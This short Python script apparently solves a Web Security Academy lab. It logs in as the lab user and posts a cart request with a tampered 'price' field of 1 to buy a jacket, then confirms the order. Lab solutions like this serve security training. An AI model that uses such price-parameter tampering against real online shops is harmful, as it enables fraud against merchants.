from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter")

    data = {"productId": "1", "quantity": "1", "price": "1", "redir": "PRODUCT"}
    session.post_path("/cart", data=data)
    logger.info('Added a "Lightweight l33t leather jacket" to cart')

    order_confirmed = "/cart/order-confirmation?order-confirmed=true"
    session.get_path(order_confirmed)
    logger.info(f'Visited "{order_confirmed}"')
